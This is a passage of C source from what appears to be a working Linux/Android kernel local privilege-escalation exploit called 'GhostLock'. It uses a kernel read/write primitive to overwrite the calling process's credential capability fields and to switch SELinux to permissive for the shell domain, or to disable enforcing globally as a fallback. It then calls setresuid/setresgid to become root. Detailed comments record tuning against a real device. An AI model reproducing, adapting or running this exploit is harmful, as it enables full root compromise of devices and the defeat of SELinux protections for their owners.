        unsigned long long wid = (unsigned long long)(unsigned int)getuid();
        unsigned long long want = wid | (wid << 32);
        if (read_tag_checked("R4", a, b) < 16) { res("R4", 0, "read failed or stale window"); return -1; }
        L("R4 cred+0x%lx = %016llx / %016llx", cred_euid, rd64u(b, 0), rd64u(b, 8));
        res("R4_IDS", rd64u(b, 0) == want && rd64u(b, 8) == want,
            "euid/egid=%llx fsuid/fsgid=%llx (want uid=%llu)",
            (unsigned long long)rd64u(b, 0), (unsigned long long)rd64u(b, 8), wid);
        if (g_fails) return -1;
    }
    /* ---------------- R5: selinux_state ---------------- */
    if (read_tag_checked("R5", A_state, b) < 16) { res("R5", 0, "read failed or stale window"); return -1; }
    memcpy(C->state, b, 16);
    L("R5 state=%016llx/%016llx", rd64u(b, 0), rd64u(b, 8));
    {
        int ok = b[0] == 0 && b[1] == 1 && b[2] == 0 && (b[3] & 1);
        res("R5_STATE", ok, "disabled=%u enforcing=%u checkreqprot=%u initialized=%02x",
            b[0], b[1], b[2], b[3]);
        if (!ok) return -1;
    }

    /* ---------- v4 carve-out: fork the shell-domain reader FIRST ---------- */
    {
        char tb[256];
        int rn = rd_file(P.path, tb, sizeof(tb));
        L("V4 CTL parent(shell) self read tcp_mem rc=%d '%.48s'", rn, rn > 0 ? tb : "");
        res("V4_SHELL_SELF_READ", rn > 0, "shell-domain tcp_mem read rc=%d", rn);
        if (rn <= 0) return -1;
    }
    /* glx_p4: record the pre-root (uid 2000) view of every VR candidate while
     * the process is still the unmodified shell identity. */
    vr_pre_probe();
    if (start_reader() != 0) { res("V4_READER_FORK", 0, "start_reader failed"); return -1; }
    L("V4 reader pid=%d listener=%s (both created while still shell)",
      (int)g_reader_pid, SRV_SHELL);
    if (reader_request(V4_OP_SELF, 0) == 0) {
        L("V4 reader self uid=%d euid=%d ctx=%s",
          g_rq->child_uid, g_rq->child_euid, g_rq->child_ctx);
        res("V4_READER_FORK", g_rq->child_uid == 2000 && strstr(g_rq->child_ctx, "shell") != NULL,
            "pid=%d child uid=%d euid=%d ctx=%s", (int)g_reader_pid,
            g_rq->child_uid, g_rq->child_euid, g_rq->child_ctx);
        if (g_fails) return -1;
    } else {
        res("V4_READER_FORK", 0, "reader did not answer self probe");
        return -1;
    }

    /* ===== glx_p11e (intent 706): PRE-ARM the per-SID permissive map ======
     * The order is the fix: the map must be live BEFORE any capability word
     * is installed, otherwise the first capable(CAP_SYS_NICE) check performed
     * by the GhostLock shots themselves caches an AVC decision without
     * AVD_FLAGS_PERMISSIVE and setresgid()/setresuid() later fail with EPERM
     * (run44).  See perm_prearm() for the full argument. */
    A_ss = PERM_SS_LINK + D;
    A_pm_node = A_ss + PERM_NODE_OFF;
    A_pm_hi = A_ss + PERM_HIGHBIT_OFF;
    g_perm_node_addr = g_vmap_base + PERM_NODE_VMAP_OFF;
    g_perm_hi_value  = g_vmap_base + PERM_HI_VMAP_OFF;
    L("PERM_PREARM ss=%016lx node=%016lx highbit=%016lx X=%016lx W=%016lx "
      "(S=%d certain=%d img_idx=%#lx)", A_ss, A_pm_node, A_pm_hi,
      g_perm_node_addr, g_perm_hi_value, g_pmsg_start,
      g_pmsg_start_certain, g_perm_img_idx);
    if (perm_prearm(A_pm_node, A_pm_hi, g_perm_node_addr,
                    g_perm_hi_value) != 0)
        return -1;                     /* clean abort: 0 further shots */
    if (g_perm_stopped) return 0;

    /* ----------- WC1..WC3: in-place capability-field rewrite ----------------
     * fact 572 + fact 609/626: keep the SELinux SID (never touch
     * task->real_cred/cred), NEVER issue a value==0 write (the four
     * cred+0x04/0x0c/0x14/0x1c id writes are the fact-609 killer), and put
     * the DAC/SETUID bits into cap_permitted / cap_effective / cap_bset.
     * uid/gid 0 is obtained by setresgid()/setresuid() after the PERM stage
     * (per-SID permissive, enforcing still 1), not by writing the id fields.
     * Shot accounting: 5 reads (R1..R5) + 3 writes = 8 chain-critical.  */
    {
        unsigned long cred = C->real_cred;
        unsigned long V = g_fake_lock ? (g_fake_lock + CRED_CAPVAL_DELTA) : 0;

        /* per-shot pre-assertions (no shot is issued unless all hold) */
        if (!is_kptr(cred)) { res("W_PRE", 0, "cred=%lx not a kernel pointer", cred); return -1; }
        if (cred == A_init_cred) { res("W_PRE", 0, "cred is &init_cred -- refusing"); return -1; }
        if (!is_kptr(V) || (V & 7) != 6 ||
            V < g_vmap_base || V + 8 > g_vmap_base + PMSG_DATA_LEN) {
            res("W_PRE", 0, "capvalue V=%lx invalid (fake_lock=%lx base=%lx)",
                V, g_fake_lock, g_vmap_base);
            return -1;
        }
        /* P6 (intent 598): a 4-mod-8 cred used to be "supported": the main
         * store landed at target-4, so V's HIGH half (0xffffffe0) became the
         * low half of cap_effective -- no DAC bits -- while every shot still
         * returned success.  Reject the whole alignment instead of silently
         * writing garbage.  parent=(target-8)&~3 must equal target-8. */
        if (!cred_align_ok(cred)) {
            res("W_PRE", 0,
                "cred=%lx align=%lu: rb_erase requires target 8-aligned "
                "(parent=(target-8)&~3); refusing the silent 4-mod-8 miswrite",
                cred, cred & 7);
            return -1;
        }
        /* P7: report V's real cap radius every run (see the consts block for
         * the enforcing/permissive reachability of each bit). */
        L("W_PRE V=%016lx off=%#lx bits: DAC(1,2)=%lu NET_ADMIN(12)=%lu "
          "NET_RAW(13)=%lu FOWNER(3)=%lu high32=%08lx (V%%8=%lu)",
          V, V - g_vmap_base, (V >> 1) & 1, (V >> 12) & 1, (V >> 13) & 1,
          (V >> 3) & 1, (unsigned long)(V >> 32), V & 7);
        if (((V >> 1) & 1) != 1 || ((V >> 2) & 1) != 1) {
            res("W_PRE", 0, "V=%016lx lost DAC bits (bit1/2 must be set)", V);
            return -1;
        }
        if (V - g_vmap_base < PMSG_OBJ_OFF + PMSG_OBJ_SIZE ||
            V + 8 > g_vmap_base + PMSG_DATA_LEN) {
            res("W_PRE", 0, "V=%016lx secondary store leaves our own page", V);
            return -1;
        }
        /* fact 609 (real device, intent 601): the previous four value==0 id
         * writes (cred+0x4/0xc/0x14/0x1c) killed the task on the very first
         * shot -- twice, on two different boots -- while the six non-zero
         * pivot writes of the same run all landed.  This build therefore never
         * issues a zero write: only the three capability words are written
         * here (value==V, non-zero), and uid/gid 0 is obtained through the
         * ordinary setresgid()/setresuid() syscalls inside the N9 permissive
         * window (SETIDS block below).
         * cap_permitted (0x30) MUST be written as well: cap_emulate_setxuid()
         * recomputes cap_effective := cap_permitted when euid goes 2000 -> 0,
         * so without WC1 every capability is lost at the setresuid() call. */
        L("WC1 cred+0x%lx := cap_permitted %016lx (non-zero write)", CRED_OFF_CAP_PERM, V);
        shot_tag("WC1_cap_perm");
        if (w8_verified_cap(cred + CRED_OFF_CAP_PERM, V, "WC1", 0) != 0) {
            res("WC1", 0, "trigger failed or silent no-op survived %d tries",
                GLX_W8_TRIES);
            return -1;
        }
        L("WC2 cred+0x%lx := cap_effective %016lx (non-zero write)", CRED_OFF_CAP_EFF, V);
        shot_tag("WC2_cap_eff");
        if (w8_verified_cap(cred + CRED_OFF_CAP_EFF, V, "WC2", 1) != 0) {
            res("WC2", 0, "trigger failed or silent no-op survived %d tries",
                GLX_W8_TRIES);
            return -1;
        }
        L("WC3 cred+0x%lx := cap_bset %016lx (non-zero write)", CRED_OFF_CAP_BSET, V);
        shot_tag("WC3_cap_bset");
        if (w8_verified_cap(cred + CRED_OFF_CAP_BSET, V, "WC3", 2) != 0) {
            res("WC3", 0, "trigger failed or silent no-op survived %d tries",
                GLX_W8_TRIES);
            return -1;
        }
        /* ---- glx_p10 (intent 676; merged i552u WC4/WC5, fact 673) ----------
         * exec survival on C.53: the adb-shell cred carries SECURE_NOROOT, so
         * cap_bprm_set_creds() skips handle_privileged_root() and the exec'd
         * set is pP' = pE' = pA' (ambient).  Writing cap_bset alone leaves
         * CapPrm=CapEff=0 after execve (fact 667 run7).  cap_bprm also
         * enforces pA' subset-of (pP' & pI), so inheritable is written first.
         * The FORK leg does not need this at all (fork has no bprm). */
        if (g_ambient) {
            L("WC4 cred+0x%lx := cap_inheritable %016lx (non-zero write)",
              CRED_OFF_CAP_INH, V);
            shot_tag("WC4_cap_inh");
            if (w8_verified_cap(cred + CRED_OFF_CAP_INH, V, "WC4", 3) != 0) {
                res("WC4", 0, "trigger failed or silent no-op survived %d tries",
                    GLX_W8_TRIES);
                return -1;
            }
            L("WC5 cred+0x%lx := cap_ambient %016lx (non-zero write)",
              CRED_OFF_CAP_AMB, V);
            shot_tag("WC5_cap_amb");
            if (w8_verified_cap(cred + CRED_OFF_CAP_AMB, V, "WC5", 4) != 0) {
                res("WC5", 0, "trigger failed or silent no-op survived %d tries",
                    GLX_W8_TRIES);
                return -1;
            }
        } else {
            res("AMBIENT_SKIP", 1,
                "--no-ambient: 14-shot fork-only tier (no execve anywhere; "
                "fork keeps uid0+CapEff because there is no bprm)");
        }
    }
    res("CRED_CAPS_ISSUED", 1, "3 or 5 non-zero capability writes issued (ids untouched, SID untouched)");
    {
        struct capstate cs;
        cap_get_self(&cs);
        cs.bnd = cap_bset_bits();
        cs.have_bnd = 1;
        L("WC_CAPS eff=%#lx bnd=%#lx (want bits %#lx)", cs.eff, cs.bnd,
          (unsigned long)CRED_CAPS_FULL);
        res("WC_CAPS", (cs.eff & CRED_CAPS_FULL) == CRED_CAPS_FULL &&
                       (cs.bnd & CRED_CAPS_FULL) == CRED_CAPS_FULL,
            "cap_effective=%#lx cap_bset=%#lx (want bits %#lx)",
            cs.eff, cs.bnd, (unsigned long)CRED_CAPS_FULL);
        if (g_ambient) {
            L("WC_AMBIENT inh=%#lx amb=%#lx (want bits %#lx)", cs.inh,
              cap_ambient_bits(), (unsigned long)CRED_CAPS_FULL);
            res("WC_AMBIENT",
                (cs.inh & CRED_CAPS_FULL) == CRED_CAPS_FULL &&
                (cap_ambient_bits() & CRED_CAPS_FULL) == CRED_CAPS_FULL,
                "cap_inheritable=%#lx cap_ambient=%#lx (want bits %#lx; "
                "execve keeps pE'(=pA') when SECURE_NOROOT is set)",
                cs.inh, cap_ambient_bits(), (unsigned long)CRED_CAPS_FULL);
        }
        if (g_fails) return -1;
    }
    if (PERM_STAGE("ambient-probe")) { g_perm_stopped = 1; return 0; }

    /* ---- v4 control: the shell domain MUST have survived the cred rewrite ---
     * (fact 572: the initialisation blob -- hence the SID -- is untouched; a
     * kernel-domain result would mean the pointers were swapped by mistake.) */
    {
        char tb[256], ctx[160] = {0};
        int rn;
        self_ctx(ctx, sizeof(ctx));
        L("V4 CTL post-cred self ctx=%s uid=%d", ctx, getuid());
        res("V4_DOMAIN_KEPT", strstr(ctx, DOM_SHELL) != NULL,
            "post-cred ctx=%s uid=%d (want %s)", ctx, getuid(), DOM_SHELL);
        rn = rd_file(P.path, tb, sizeof(tb));
        L("V4 CTL post-cred shell-domain self read tcp_mem rc=%d (shell keeps proc_net "
          "read after the in-place rewrite) '%.48s'", rn, rn > 0 ? tb : "");
        {
            char ub[128];
            int ur = rd_file("/proc/sys/net/ipv4/udp_mem", ub, sizeof(ub));
            L("V4 CTL post-cred self read udp_mem rc=%d (second proc_net node)", ur);
        }
        if (reader_request(V4_OP_SELF, 0) == 0)
            res("V4_READER_UNAFFECTED",
                g_rq->child_uid == 2000 && strstr(g_rq->child_ctx, "shell") != NULL,
                "post-swap child uid=%d euid=%d ctx=%s",
                g_rq->child_uid, g_rq->child_euid, g_rq->child_ctx);
    }

    /* ============ PERM: per-SID (per-type) permissive (intent 662/676) ======
     * Replaces the N9 global enforcing=0 write.  enforcing never leaves 1:
     * security_compute_av() tests ebitmap_get_bit(&policydb->permissive_map,
     * scontext->type) and sets AVD_FLAGS_PERMISSIVE; avc_denied() then grants
     * the denied bits.  Only the shell domain (type 1464) is affected.
     * Fixed order / guards:
     *   PERM_PRE   read {node,highbit}; both must be 0 (dirty -> cold start)
     *   PERM_VRF   read X back from the pmsg window (rotation proof)
     *   PERMNODE   perm_map.node = X        (highbit==0 -> fully inert)
     *   PERM_HI    perm_map.highbit = W     (activates; node->next is 0)
     *   PERM_SET   read selinux_state      (enforcing still 1)
     * HARD: after this stage NO policy may be loaded.  policy_destroy() would
     * kmem_cache_free() a pmsg page (fact 659 (5)) -> panic.
     *
     * glx_p10 (intent 676 item ③): with --perm-fallback=n9 ANY PERM failure
     * that does not leave a half-armed map behind (PERM_PRE / PERM_VRF /
     * PERMNODE / PERM_HI / PERM_SET / enforcing check) falls through to the
     * legacy global N9 write instead of aborting the run.  No zero-value write
     * is ever issued either way; the enforcing bit is restored at the end of
     * this function through the LEGITIMATE selinuxfs path (fact 674). */
    A_ss = PERM_SS_LINK + D;
    A_pm_node = A_ss + PERM_NODE_OFF;
    A_pm_hi = A_ss + PERM_HIGHBIT_OFF;
    g_perm_node_addr = g_vmap_base + PERM_NODE_VMAP_OFF;
    g_perm_hi_value  = g_vmap_base + PERM_HI_VMAP_OFF;
    L("PERM ss=%016lx node=%016lx highbit=%016lx (S=%d certain=%d img_idx=%#lx)",
      A_ss, A_pm_node, A_pm_hi, g_pmsg_start, g_pmsg_start_certain, g_perm_img_idx);
    if (g_perm_prearmed) {
        L("PERM_PREARMED_STAGE: per-SID map already armed BEFORE the "
          "capability writes (intent 706); PERM_PRE/PERM_VRF/PERMNODE/"
          "PERM_HI are skipped here (0 GhostLock ops in this block)");
        res("PERM_PREARMED_STAGE", 1,
            "armed at the pre-cap stage; 0 GhostLock reads/writes in the "
            "legacy PERM block");
        if (g_fails) return -1;
        goto perm_fallback_done;
    }
    if (g_perm_skip) {
        res("PERM_SKIP", 1,
            "PERM not armed (ambiguous ring start S or --perm-skip); "
            "the --perm-fallback=n9 window is used instead");
        goto perm_n9_fallback;
    }
    if (g_perm_armed) {
        /* glx_p11 (intent 696 fix ③, third state): this boot is ALREADY armed
         * (fact 694: node=X, highbit=W).  Both arming writes are skipped --
         * in particular the same-value .highbit rewrite that has been observed
         * to abort (fact 692) -- but the armed state is read back and the fake
         * node's content re-verified before SETIDS.  Any mismatch aborts
         * cleanly (0 writes) instead of running against a half-armed map. */
        int nARM = read_tag("PERM_ARMED", A_pm_node, b);
        if (nARM < 16) {
            res("PERM_ARMED_STATE", 0, "readback failed rc=%d", nARM);
            return -1;
        }
        if (!perm_armed_decide(rd64u(b, 0), (unsigned int)rd64u(b, 8),
                               g_perm_node_addr,
                               (unsigned int)g_perm_hi_value))
            return -1;
        nARM = read_tag("PERM_VRF", g_perm_node_addr, b);
        if (nARM < 16) {
            res("PERM_VRF", 0, "read failed rc=%d", nARM);
            return -1;
        }
        {
            unsigned long vn = rd64u(b, 0), vm = rd64u(b, 8);
            int vok = perm_vrf_decide(vn, vm);
            L("PERM_VRF(armed) X=%016lx next=%016lx maps[0]=%016lx (S=%d)",
              g_perm_node_addr, vn, vm, g_pmsg_start);
            res("PERM_VRF", vok,
                "armed readback X=%lx next=%lx maps0=%lx (S=%d)",
                g_perm_node_addr, vn, vm, g_pmsg_start);
            if (!vok) return -1;
        }
        res("PERM_ARMED_CONTINUE", 1,
            "third state: map already armed on this boot -> straight to SETIDS "
            "(no PERM_PRE/PERMNODE/PERM_HI write)");
        goto perm_fallback_done;
    }
    if (read_tag("PERM_PRE", A_pm_node, b) < 16) {
        res("PERM_PRE", 0, "read failed");
        if (g_perm_fallback_n9) goto perm_n9_fallback;
        return -1;
    }
    {
        unsigned long pn = rd64u(b, 0);
        unsigned int ph = (unsigned int)rd64u(b, 8);
        int ok = (pn == 0 && ph == 0);
        int forced = 0;
        /* glx_p10 --perm-force (planner correction, fact 687): an earlier run
         * on THIS boot may already have written our fake node with
         * highbit==0 (inert).  Re-arming is then safe ONLY if the node is
         * exactly the planned address and its content is still the PERM_IMG
         * blob; PERM_VRF below is the content gate (next==0, maps[0]==1<<56)
         * and any mismatch aborts cleanly before PERM_HI. */
        if (!ok && g_perm_force && pn == g_perm_node_addr && ph == 0) {
            ok = 1;
            forced = 1;
        }
        L("PERM_PRE node=%016lx highbit=%u (want 0/0; --perm-force allows "
          "node==planned X with a PERM_VRF content gate)", pn, ph);
        res("PERM_MAP_EMPTY", ok,
            "permissive_map node=%lx highbit=%u (dirty policy => cold start "
            "before re-arming; or --perm-force if node==%lx)",
            pn, ph, g_perm_node_addr);
        if (forced)
            res("PERM_FORCE", 1,
                "same-boot re-arm: node==planned X=%lx, highbit=0, content "
                "still gated by PERM_VRF", pn);
        if (!ok) {
            if (g_perm_fallback_n9) goto perm_n9_fallback;
            return -1;
        }
    }
    if (PERM_STAGE("permpre")) { g_perm_stopped = 1; return 0; }
    if (!is_kptr(g_perm_node_addr) || !is_kptr(g_perm_hi_value) ||
        (unsigned int)g_perm_hi_value < PERM_HI_MIN) {
        res("PERM_PTRS", 0, "X=%016lx W=%016lx (W low32=%u < %lu)",
            g_perm_node_addr, g_perm_hi_value,
            (unsigned int)g_perm_hi_value, PERM_HI_MIN);
        if (g_perm_fallback_n9) goto perm_n9_fallback;
        return -1;
    }
    if (read_tag("PERM_VRF", g_perm_node_addr, b) < 16) {
        res("PERM_VRF", 0, "read failed");
        if (g_perm_fallback_n9) goto perm_n9_fallback;
        return -1;
    }
    {
        unsigned long vn = rd64u(b, 0);
        unsigned long vm = rd64u(b, 8);
        unsigned long want = 1UL << (PERM_SHELL_BIT % 64);
        int ok = (vn == 0) && (vm == want);
        L("PERM_VRF X=%016lx next=%016lx maps[0]=%016lx (want 0/%016lx)",
          g_perm_node_addr, vn, vm, want);
        res("PERM_NODE_IMAGE", ok,
            "X=%lx next=%lx maps0=%lx (S=%d) -- mismatch aborts BEFORE "
            "activation", g_perm_node_addr, vn, vm, g_pmsg_start);
        if (!ok) {
            if (g_perm_fallback_n9) goto perm_n9_fallback;
            return -1;
        }
    }
    L("PERMNODE *(perm_map.node)=%016lx (value=%016lx; highbit still 0 => inert)",
      A_pm_node, g_perm_node_addr);
    shot_tag("PERMNODE");
    if (w8_verified(A_pm_node, g_perm_node_addr, A_pm_node, 0, 0,
                            "PERMNODE") != 0) {
        res("PERMNODE", 0, "trigger failed or silent no-op survived %d tries",
            GLX_W8_TRIES);
        if (g_perm_fallback_n9) goto perm_n9_fallback;
        return -1;
    }
    if (PERM_STAGE("permnode")) { perm_dwell(); g_perm_stopped = 1; return 0; }
    L("PERM_HI *(perm_map.highbit)=%016lx (highbit:=%u, secondary store at W=%016lx)",
      A_pm_hi, (unsigned int)g_perm_hi_value, g_perm_hi_value);
    shot_tag("PERM_HI");
    /* activation write: readback compares the LOW 32 bits only (the u32
     * .highbit lives inside a 64-bit slot whose upper half is another policydb
     * field we must not require).  Verified through A_pm_node: a read at
     * A_pm_hi would clobber perm_map.node itself (the primitive's A-8 side
     * store), so we read the {node,highbit} pair instead. */
    if (w8_verified(A_pm_hi, g_perm_hi_value, A_pm_node, 8, 1,
                    "PERM_HI") != 0) {
        res("PERM_HI", 0, "trigger failed or silent no-op survived %d tries",
            GLX_W8_TRIES);
        if (g_perm_fallback_n9) goto perm_n9_fallback;
        return -1;
    }
    if (PERM_STAGE("permhi")) { perm_dwell(); g_perm_stopped = 1; return 0; }
    if (read_tag("PERM_SET", A_state, b) < 16) {
        res("PERM_SET", 0, "read failed");
        if (g_perm_fallback_n9) goto perm_n9_fallback;
        return -1;
    }
    L("PERM_SET state=%02x %02x %02x %02x %02x%02x%02x%02x",
      b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]);
    {
        int eok = (b[1] == 1), dok = (b[0] == 0);
        res("PERM_ENFORCING", eok, "sel_read_enforce(state[1])=%u (want 1)", b[1]);
        res("PERM_DISABLED", dok, "state[0]=%u (want 0)", b[0]);
        if (!eok || !dok) {
            if (g_perm_fallback_n9) goto perm_n9_fallback;
            return -1;
        }
    }
    {
        char ctx[160];
        ctx[0] = 0;
        self_ctx(ctx, sizeof(ctx));
        L("PERM domain ctx=%s uid=%d (per-SID permissive does not change label)",
          ctx, getuid());
        res("PERM_DOMAIN", strstr(ctx, DOM_SHELL) != NULL,
            "ctx=%s (want %s)", ctx, DOM_SHELL);
        if (g_fails) return -1;
    }
    if (g_perm_probe_path) {
        char pb[512];
        int pr = rd_file(g_perm_probe_path, pb, sizeof(pb));
        L("PERM_PROBE %s rc=%d '%.40s' (diagnostic, NOT a gate: a denial cached "
          "before activation stays cached in the AVC)", g_perm_probe_path, pr,
          pr >= 0 ? pb : "");
        printf("GLX|PERM_PROBE=%s rc=%d path=%s\n", pr >= 0 ? "ALLOW" : "DENY",
               pr, g_perm_probe_path);
    }
    if (g_fails) return -1;

    /* glx_p11 (intent 696 fix ①): the PERM path ENDS here.  glx_p10 fell
     * straight through into the perm_n9_fallback label, whose first statement
     * rejects a run that did not ask for --perm-fallback=n9 -> SETIDS was
     * never reached (fact 695).  Only an explicit fallback may enter it. */
    if (perm_continue_to_setids())
        goto perm_fallback_done;

    /* ---- N9 fallback (intent 676 item ③): the legacy global permissive ----
     * Only reached with --perm-fallback=n9.  Exactly one extra GhostLock shot
     * (the reverse-main write of state+1); if the board is already permissive
     * the shot is skipped entirely.  SETIDS then runs inside the window and
     * the tail of this function restores enforcing through selinuxfs while
     * the cred is already uid0+CAP_DAC_OVERRIDE (fact 674 N10_LEGIT). */
perm_n9_fallback:
    if (!g_perm_fallback_n9) {
        res("PERM_FALLBACK", 0,
            "internal: fallback label reached without --perm-fallback=n9");
        return -1;
    }
    {
        char e0[32];
        int r0 = rd_file("/sys/fs/selinux/enforce", e0, sizeof(e0));
        if (r0 >= 0 && e0[0] == '0') {
            L("N9 fallback: enforce already 0 -- no extra GhostLock shot");
            g_enforce_off = 1;
            g_n9_used = 1;
            goto perm_fallback_done;
        }
    }
    if (!C->p0) { res("N9", 0, "no P0"); return -1; }
    L("N9 fallback reverse-main write target=%016lx value=%016lx (state+1)",
      C->p0 + 8, A_state + 1);
    shot_tag("N9");
    if (w8(C->p0 + 8, A_state + 1) != 0) { res("N9", 0, "trigger failed"); return -1; }
    {
        char e[32];
        int nn = rd_file("/sys/fs/selinux/enforce", e, sizeof(e));
        L("N9 enforce=%s (rc=%d)", nn >= 0 ? e : "?", nn);
        res("N9_PERMISSIVE", nn >= 0 && e[0] == '0', "enforce='%s'",
            nn >= 0 ? e : "?");
        if (!(nn >= 0 && e[0] == '0')) return -1;
        g_enforce_off = 1;
        g_n9_used = 1;
    }
perm_fallback_done:
    ;

    /* ---- i731 (intent 738): the LAST GhostLock shot has been issued above.
     * Seal the primitive now: purge the fake lock out of the pmsg page and
     * join/kill every helper thread BEFORE any cred commit, so nothing can
     * climb the stale PI chain during SETIDS.  --stop-after=postshot stops
     * here on purpose (discriminator: "last shot alone resets" vs
     * "SETID_GATE/SETIDS is required"). */
    {
        int qt = seal_primitive();
        if (g_quiesce_tasks > 0)
            res("QUIESCE_TASKS", g_quiesce_tasks == 1,
                "threads=%d after the final shot (want 1; >1 leaves a PI walker)",
                g_quiesce_tasks);
        if (PERM_STAGE("postshot")) {
            L("STOP_AFTER=postshot: primitive sealed, helpers quiesced; "
              "SETID_GATE and SETIDS deliberately NOT called");
            res("POSTSHOT_STOP", 1,
                "sealed=%d threads=%d shots=%d (a reset from here on means the "
                "last shot alone amplified asynchronously)",
                g_shots_sealed, qt, g_shots);
            return 0;
        }
    }

    /* glx_p11e (intent 706): capability-class gate BEFORE any id change.
     * setgroups(0,NULL) runs the exact same kernel path as setresgid(0,0,0):
     *   ns_capable(CAP_SETGID) -> cap_capable -> selinux_capable ->
     *   avc_has_perm_noaudit(sid, sid, SECCLASS_CAPABILITY, 1<<6)
     * If that returns EPERM (stale AVC node, wrong SID bit, map not really
     * active) we MUST NOT call setresgid/setresuid: run44 showed the
     * EPERM-then-self-reset path.  Clean abort, 0 further shots. */
    {
        long gr;
        errno = 0;
        gr = syscall(SYS_setgroups, 0, NULL);
        L("SETID_GATE setgroups(0,NULL) rc=%ld errno=%d (identical "
          "capable(CAP_SETGID) path as setresgid)", gr, errno);
        res("SETID_GATE", gr == 0,
            "setgroups(0,NULL) rc=%ld errno=%d (SECCLASS_CAPABILITY bit6)",
            gr, errno);
        res("PERM_BEHAVIOR_PROOF", gr == 0,
            "authoritative per-SID permissive proof: the exact "
            "capable(CAP_SETGID) path returns %ld (file oracle unproven=%d)",
            gr, g_perm_behavior_unproven);
        if (gr != 0) {
            L("SETID_GATE_ABORT: capability-class gate denied -> "
              "setresgid/setresuid NOT called");
            return -1;
        }
    }

    /* ---- i739 (intent 754): MINIMAL-RISK SETIDS precheck -------------------
     * See the "MINIMAL-RISK SETIDS" note above for the instruction-level
     * evidence.  In short:
     *   - capable() -> selinux_capable() only reaches security_compute_av /
     *     ebitmap_get_bit on an AVC *miss*; the SETID_GATE below is the first
     *     capability-class check after the whole-map arm, so the
     *     (shell,shell,CAPABILITY) decision is computed once and every later
     *     capable() (the one inside setresgid included) is a cache hit.  A
     *     half-armed / silent-no-op fake node can only fail BEFORE this gate's
     *     RES line, never after it.
     *   - the glibc setresgid/setresuid wrappers take the NPTL setxid
     *     broadcast (tgkill SIGSETXID) whenever more than one thread is alive;
     *     that signal aborts the helpers' GhostLock PI futexes and is the only
     *     remaining consumer of the stale rt_mutex/pi_state residue.
     * Fail closed: require the primitive to be sealed and Threads==1 (p11h
     * purge+quiesce) before any id change; 0 further shots on refusal. */
    {
        int threads = -1, pre;
        pre = setids_precheck(&threads);
        if (pre != 0) {
            L("SETIDS_PRECHECK fail rc=%d threads=%d sealed=%d -- raw SETIDS "
              "refused, 0 further shots", pre, threads, g_shots_sealed);
            res("SETIDS_PRECHECK", 0,
                "rc=%d threads=%d sealed=%d (need sealed==1 and Threads==1; "
                "--allow-mt-setids overrides the thread gate)",
                pre, threads, g_shots_sealed);
            return -1;
        }
        res("SETIDS_PRECHECK", 1,
            "sealed=1 threads=%d: raw setresgid/setresuid, no NPTL setxid "
            "broadcast / no SIGSETXID tgkill", threads);
    }

    /* ---------------- SETIDS: uid/gid 0 through the ordinary syscalls -------
     * fact 609: writing 0 into the cred id fields is not usable on this board
     * (first zero-value shot => SIGKILL + panic), so the ids are changed the
     * the legitimate way while the per-SID permissive is active:
     *   - the kernel-side check only needs CAP_SETUID|CAP_SETGID in
     *     cap_effective, which V (0xC6 low bits) carries;
     *   - the SELinux capability check is permissive for scontext->type ==
     *     shell (enforcing stays 1; only the per-type map is flipped);
     *   - glibc's setresuid/setresgid use the NPTL setxid broadcast, so the
     *     victim thread T switches too.  Without that T would keep the
     *     uid-2000 cred and every later sched_setattr() would fail
     *     __sched_setscheduler()'s ptrace_may_access() with -EPERM.
     * cap_effective is recomputed to cap_permitted (=V) by cap_emulate_setxuid
     * on the 2000 -> 0 transition, which is why WC1 wrote cap_permitted. */
    {
        int rg, ru, sfg, sfu;
        {
            struct capstate cs0;
            cap_get_self(&cs0);
            L("SETIDS begin: per-SID permissive active (enforcing still 1), "
              "calling setresgid/setresuid (eff=%#lx)", cs0.eff);
        }
        /* i739: raw svc 149/147 (no NPTL setxid broadcast).  With the
         * Threads==1 precondition above there is no other thread whose
         * credentials the broadcast would have updated. */
        errno = 0;
        if (g_setids_glibc) rg = setresgid(0, 0, 0);
        else                rg = (int)setids_syscall(SYS_setresgid, 0, 0, 0);
        L("SETIDS setresgid(0,0,0) rc=%d errno=%d", rg, errno);
        errno = 0;
        if (g_setids_glibc) ru = setresuid(0, 0, 0);
        else                ru = (int)setids_syscall(SYS_setresuid, 0, 0, 0);
        L("SETIDS setresuid(0,0,0) rc=%d errno=%d", ru, errno);
        errno = 0;
        sfg = (int)setfsgid(0);
        L("SETIDS setfsgid(0) prev=%d errno=%d", sfg, errno);
        errno = 0;
        sfu = (int)setfsuid(0);
        L("SETIDS setfsuid(0) prev=%d errno=%d", sfu, errno);
        {
            struct capstate cs;
            char ctx[160] = {0};
            int su = (int)setfsuid((uid_t)-1);
            int sg = (int)setfsgid((gid_t)-1);
            self_ctx(ctx, sizeof(ctx));
            cap_get_self(&cs);
            cs.bnd = cap_bset_bits();
            cs.have_bnd = 1;
            L("SETIDS uid=%d euid=%d gid=%d egid=%d fsuid=%d fsgid=%d ctx=%s eff=%#lx bnd=%#lx",
              getuid(), geteuid(), getgid(), getegid(), su, sg, ctx, cs.eff, cs.bnd);
            res("V8_IDS", ru == 0 && rg == 0 && getuid() == 0 && geteuid() == 0 &&
                          getgid() == 0 && getegid() == 0 && su == 0 && sg == 0,
                "uid=%d euid=%d gid=%d egid=%d fsuid=%d fsgid=%d",
                getuid(), geteuid(), getgid(), getegid(), su, sg);
            res("V8_DOMAIN", strstr(ctx, DOM_SHELL) != NULL,
                "ctx=%s (want %s)", ctx, DOM_SHELL);
            res("V8_CAP_EFF", (cs.eff & CRED_CAP_BITS) == CRED_CAP_BITS,
                "cap_effective=%#lx (want bits %#lx)", cs.eff, CRED_CAP_BITS);
            res("V8_CAP_BSET", (cs.bnd & CRED_CAP_BITS) == CRED_CAP_BITS,
                "cap_bset=%#lx (want bits %#lx)", cs.bnd, CRED_CAP_BITS);
            if (g_ambient) {
                res("V8_CAP_INH", (cs.inh & CRED_CAPS_FULL) == CRED_CAPS_FULL,
                    "cap_inheritable=%#lx (want bits %#lx)", cs.inh,
                    (unsigned long)CRED_CAPS_FULL);
                res("V8_CAP_AMB",
                    (cap_ambient_bits() & CRED_CAPS_FULL) == CRED_CAPS_FULL,
                    "cap_ambient=%#lx (want bits %#lx; exec survival on C.53)",
                    cap_ambient_bits(), (unsigned long)CRED_CAPS_FULL);
            }
            if (g_fails) return -1;
            /* glx_p11 (intent 696 (C)): uid0 forensics inside this very
             * process, before a --stop-after=permset exit can happen. */
            perm_forensics();
            if (g_fails) return -1;
        }
    }
    /* ---- glx_p10 (intent 676 item ③): N9-fallback write-back --------------
     * The fallback leaves the board globally permissive.  We are now uid0 with
